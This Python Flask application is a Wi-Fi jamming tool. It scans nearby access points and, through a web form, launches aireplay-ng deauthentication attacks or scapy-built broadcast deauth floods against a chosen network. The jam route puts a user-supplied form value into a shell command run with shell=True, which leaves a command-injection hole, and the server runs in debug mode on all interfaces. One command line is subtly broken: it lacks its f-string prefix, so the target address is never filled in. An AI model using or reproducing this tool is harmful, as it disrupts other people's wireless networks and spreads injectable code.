import re
import os
import signal
import subprocess

from flask import Flask, render_template, request, redirect, url_for
import scapy.all

from ap import AP

app = Flask(__name__)

BROADCAST = "ff:ff:ff:ff:ff:ff"
MANGO = "94:83:C4:1A:34:56"

PATTERN = {
    "MAC Address": 'Address:(.*)',
    "ESSID": 'ESSID:(.*)',
    "Power": 'Signal level=(.*)',
    "Channel": 'Channel:(.*)',
    "ID": '(.*) - Address'
}

command_process = None


def scan_for_aps():
    aps = []
    print(f"[*] Scanning for APs, please wait")
    result = subprocess.check_output(f"sudo iwlist wlan0 s",
                                     shell=True).decode()
    for name, pattern in PATTERN.items():
        PATTERN[name] = re.compile(pattern)
    for line in result.split("Cell"):
        if line and "Scan completed" not in line:
            try:
                ap = AP()
                ap.mac = PATTERN["MAC Address"].findall(line)[0].strip()
                ap.ssid = PATTERN["ESSID"].findall(line)[0].strip('"')
                ap.power = int(PATTERN["Power"]
                               .findall(line)[0]
                               .strip()
                               .split(" ")[0]) * -1
                ap.channel = PATTERN["Channel"].findall(line)[0].strip()
                ap.id = str(int(PATTERN["ID"].findall(line)[0].strip()))
                ap.clean()
                aps.append(ap)
            except IndexError:
                continue
    aps.sort(key=lambda x: x.power, reverse=False)
    aps.sort(key=lambda x: x.ssid in ["BTWifi-X", "BTWi-fi", "Unknown SSID"])
    return aps


def send_frames(tgt):
    packet = scapy.all.RadioTap() / \
        scapy.all.Dot11(addr1=BROADCAST,
                        addr2=tgt,
                        addr3=tgt) / \
        scapy.all.Dot11Deauth()
    scapy.all.sendp(packet, iface="wlan1", count=10000,
                    inter=0.2, verbose=1)


@app.route("/jam", methods=["POST"])
def jam():
    global command_process
    if command_process is not None and command_process.poll() is None:
        return "command already running", 400
    ap_info = request.form.get("AP_INFO")
    ap_address, channel = ap_info.split("-")
    command = f"sudo iwconfig wlan1 channel {channel}; " + \
              "sudo aireplay-ng -0 0 -a {ap_address} wlan1"
    command_process = subprocess.Popen(command,
                                       preexec_fn=os.setsid,
                                       shell=True)
    return render_template("jamming.html")


@app.route("/stop_jam")
def stop_jam():
    global command_process
    if command_process is None or command_process.poll() is not None:
        return "Command is not running", 400
    os.killpg(os.getpgid(command_process.pid), signal.SIGTERM)
    command_process = None
    return redirect(url_for("home"))


@app.route("/")
def home():
    aps = scan_for_aps()
    return render_template("index.html", aps=aps)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
